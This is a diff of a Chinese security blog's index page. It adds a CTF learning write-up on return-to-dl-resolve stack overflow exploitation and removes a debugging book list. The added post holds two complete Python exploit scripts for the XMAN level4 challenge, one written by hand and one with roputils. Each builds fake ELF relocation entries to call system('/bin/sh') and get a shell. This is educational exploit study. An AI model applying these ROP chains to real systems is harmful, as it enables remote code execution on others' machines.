@@ -155,6 +155,84 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/10/07/PWN/Linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Breturn-to-dl-resolve/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="D0m021ng">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="不要说话">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2016/10/07/PWN/Linux%E6%A0%88%E6%BA%A2%E5%87%BA%E5%88%A9%E7%94%A8%E4%B9%8Breturn-to-dl-resolve/" class="post-title-link" itemprop="url">Linux栈溢出利用之return to dl-resolve实例</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2016-10-07 23:15:38" itemprop="dateCreated datePublished" datetime="2016-10-07T23:15:38+00:00">2016-10-07</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2017-03-02 00:48:02" itemprop="dateModified" datetime="2017-03-02T00:48:02+00:00">2017-03-02</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Security/" itemprop="url" rel="index"><span itemprop="name">Security</span></a>
+                </span>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <p>最近学习了一下漏洞原理与利用，学习到栈溢出漏洞利用的一些技巧，记录下自己的学习心得。关于return to dl-resolve的原理，网上有许多的文章已经写的很清楚了，就不赘述。本文主要是根据return to dl-resolve的原理，实现32位和64位环境下的漏洞利用。</p>
+<h3 id="0x00-准备知识"><a href="#0x00-准备知识" class="headerlink" title="0x00.　准备知识"></a>0x00.　准备知识</h3><p><strong>(1) 实验环境：</strong><br> 64bit Ubuntu16.04, kernel : 4.4.0<br><strong>(2) 32位与64位区别：</strong><br>Linux下32位应用的参数传递主要是通过栈来传递；而64位应用的前六个参数分别通过RDI, RSI, RDX, RCX, R8和 R9传递，如果有多余的参数，才会通过栈来传递。因此，在覆盖返回值时，平衡堆栈时就需要用到gadget。<br><strong>(3) return to dl-resolve</strong><br>Linux下可执行文件ELF的动态链接时，采用了延迟绑定技术。原理是：动态链接的库里有许多函数，但是可执行文件ELF不会全部调用这些函数，有些函数直到程序运行结束也不会被调用。因此，Linux下的链接器动态链接时不会进行函数地址重定位，而是等到函数第一次被调用时，进行函数地址重地位，也就是通过_dl_runtime_resolve函数到库中查找该函数的实际地址，并将其写入到该函数的got表中。<br>当栈溢出后，我们就可以控制程序流程到dl-resolve，解析出system函数的地址，从而实现漏洞的利用。</p>
+<h3 id="0x01-32位环境下的return-to-dl-resolve实例"><a href="#0x01-32位环境下的return-to-dl-resolve实例" class="headerlink" title="0x01.　32位环境下的return to dl-resolve实例"></a>0x01.　32位环境下的return to dl-resolve实例</h3><p>下面以XMAN level4为例，分别使用手写和使用工具roputils实现漏洞利用。<br><strong>return to dl-resolve by manul</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">    p = process(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">    gdb.attach(p)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>, <span class="number">10086</span>)</span><br><span class="line"></span><br><span class="line">offset = <span class="number">0x8c</span></span><br><span class="line">stack_size = <span class="number">0x400</span></span><br><span class="line">vulfun = <span class="number">0x0804844b</span></span><br><span class="line">bss_addr = <span class="number">0x804a024</span></span><br><span class="line">base_stage = bss_addr + stack_size</span><br><span class="line"></span><br><span class="line">pppr = <span class="number">0x8048509</span></span><br><span class="line">p_ebp_r = <span class="number">0x804850b</span></span><br><span class="line">leave_r = <span class="number">0x80483b8</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./level4&#x27;</span>)</span><br><span class="line">write_plt = elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">write_got = elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span>  </span><br><span class="line">    payload1 = <span class="string">&#x27;A&#x27;</span> * offset + p32(read_plt) + p32(pppr) + p32(<span class="number">0</span>) + p32(base_stage)</span><br><span class="line">    payload1 += p32(<span class="number">100</span>) + p32(p_ebp_r) + p32(base_stage) + p32(leave_r)</span><br><span class="line">    p.sendline(payload1)</span><br><span class="line"></span><br><span class="line">    plt_start = <span class="number">0x8048300</span></span><br><span class="line">    rel_plt = <span class="number">0x80482b0</span></span><br><span class="line">    index_offset = (base_stage + <span class="number">28</span>) - rel_plt</span><br><span class="line">    dynsym_addr = <span class="number">0x80481cc</span></span><br><span class="line">    dynstr_addr = <span class="number">0x804822c</span></span><br><span class="line">    fake_sym = base_stage + <span class="number">36</span></span><br><span class="line">    align = <span class="number">0x10</span> - ((fake_sym - dynsym_addr) &amp; <span class="number">0xf</span>)</span><br><span class="line">    fake_sym = fake_sym +align</span><br><span class="line">    index_dynsym = (fake_sym - dynsym_addr) / <span class="number">0x10</span></span><br><span class="line">    r_info = (index_dynsym &lt;&lt; <span class="number">8</span>) | <span class="number">0x7</span></span><br><span class="line">    fake_reloc = p32(write_got) + p32(r_info)</span><br><span class="line">    st_name = (fake_sym + <span class="number">16</span>) - dynstr_addr</span><br><span class="line">    fake_sym = p32(st_name) + p32(<span class="number">0</span>) + p32(<span class="number">0</span>) + p32(<span class="number">0x12</span>)</span><br><span class="line"></span><br><span class="line">    payload2 = <span class="string">&#x27;B&#x27;</span> * <span class="number">4</span> + p32(plt_start) +p32(index_offset) + <span class="string">&#x27;C&#x27;</span>*<span class="number">4</span> + p32(base_stage+<span class="number">80</span>)</span><br><span class="line">    payload2 += <span class="string">&#x27;A&#x27;</span>*<span class="number">8</span> + fake_reloc + <span class="string">&#x27;D&#x27;</span>*align</span><br><span class="line">    payload2 += fake_sym + <span class="string">&#x27;system\x00&#x27;</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">80</span>, <span class="string">&#x27;A&#x27;</span>)</span><br><span class="line">    payload2 += <span class="string">&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">    payload2 = payload2.ljust(<span class="number">100</span>, <span class="string">&#x27;A&#x27;</span>)  </span><br><span class="line">    p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></p>
+<p><strong>return to dl-resolve by roputils</strong><br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> roputils <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">DEBUG = <span class="number">1</span></span><br><span class="line">fpath = <span class="string">&#x27;./level4&#x27;</span></span><br><span class="line">offset = <span class="number">0x8c</span></span><br><span class="line"></span><br><span class="line">rop = ROP(fpath)</span><br><span class="line">addr_bss = rop.section(<span class="string">&#x27;.bss&#x27;</span>)</span><br><span class="line">addr_plt_read = <span class="number">0x08048310</span></span><br><span class="line">addr_got_read = <span class="number">0x0804a00c</span></span><br><span class="line"></span><br><span class="line">buf = rop.retfill(offset)</span><br><span class="line"><span class="comment"># roputils has changed call function in new version</span></span><br><span class="line">buf += rop.call(addr_plt_read, <span class="number">0</span>, addr_bss, <span class="number">100</span>)</span><br><span class="line">buf += rop.dl_resolve_call(addr_bss+<span class="number">20</span>, addr_bss)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> DEBUG:</span><br><span class="line">	p = Proc(rop.fpath)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	p = Proc(host=<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>, port=<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line">p.write(p32(<span class="built_in">len</span>(buf)) + buf)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;[+] read: %r&quot;</span> % p.read(<span class="built_in">len</span>(buf))</span><br><span class="line"></span><br><span class="line">buf = rop.string(<span class="string">&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">20</span>, buf)</span><br><span class="line">buf += rop.dl_resolve_data(addr_bss+<span class="number">20</span>, <span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">buf += rop.fill(<span class="number">100</span>, buf)</span><br><span class="line"></span><br><span class="line">p.write(buf)</span><br><span class="line">p.interact(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p>
+<h3 id="0x02-参考文献："><a href="#0x02-参考文献：" class="headerlink" title="0x02.　参考文献："></a>0x02.　参考文献：</h3><p><a target="_blank" rel="noopener" href="http://rk700.github.io/article/2015/08/09/return-to-dl-resolve">1. ROP之return to dl-resolve</a><br><a target="_blank" rel="noopener" href="http://www.evil0x.com/posts/19226.html">2. 通过ELF动态装载构造ROP链（Return-to-dl-resolve）</a></p>
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/10/07/PWN/Linux%E6%A0%88%E6%BA%A2%E5%87%BA%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E5%B0%8F%E7%BB%93/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1303,86 +1381,6 @@
   
   
 
-      
-  
-  
-  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2016/06/13/Debug/%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B9%A6%E5%8D%95/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="image" content="/images/avatar.gif">
-      <meta itemprop="name" content="D0m021ng">
-      <meta itemprop="description" content="">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="不要说话">
-    </span>
-      <header class="post-header">
-        <h2 class="post-title" itemprop="name headline">
-          
-            <a href="/2016/06/13/Debug/%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95%E4%B9%A6%E5%8D%95/" class="post-title-link" itemprop="url">软件调试书单</a>
-        </h2>
-
-        <div class="post-meta">
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              <span class="post-meta-item-text">发表于</span>
-
-              <time title="创建时间：2016-06-13 21:28:25" itemprop="dateCreated datePublished" datetime="2016-06-13T21:28:25+00:00">2016-06-13</time>
-            </span>
-              <span class="post-meta-item">
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-calendar-check-o"></i>
-                </span>
-                <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2021-04-05 06:58:55" itemprop="dateModified" datetime="2021-04-05T06:58:55+00:00">2021-04-05</time>
-              </span>
-            <span class="post-meta-item">
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/%E8%BD%AF%E4%BB%B6%E8%B0%83%E8%AF%95/" itemprop="url" rel="index"><span itemprop="name">软件调试</span></a>
-                </span>
-            </span>
-
-          
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-          <p>最近准备学习一下调试技术，为以后的逆向分析打下基础，主要关注是Linux平台下的软件调试。现在列举一些调试相关的书籍，一边看书，一边实践。</p>
-<ol>
-<li>软件调试的艺术（The Art of Debugging with GDB,DDD, and Eclipse）, 2009.11</li>
-<li>软件调试实战 （The Developers Guide to Debugging）, 2010.2</li>
-<li>Debug It! Find, Repair, and Prevent Bugs in Your Code , 2011.6</li>
-<li>格蠹汇编 —— 软件调试案例集锦</li>
-</ol>
-
-      
-    </div>
-
-    
-    
-    
-      <footer class="post-footer">
-        <div class="post-eof"></div>
-      </footer>
-  </article>
-  
-  
-  
-
 
   
   <nav class="pagination">
@@ -1452,20 +1450,20 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">27</span>
+          <span class="site-state-item-count">28</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
       <div class="site-state-item site-state-categories">
             <a href="/categories/">
           
-        <span class="site-state-item-count">4</span>
+        <span class="site-state-item-count">5</span>
         <span class="site-state-item-name">分类</span></a>
       </div>
       <div class="site-state-item site-state-tags">
             <a href="/tags/">
           
-        <span class="site-state-item-count">5</span>
+        <span class="site-state-item-count">6</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
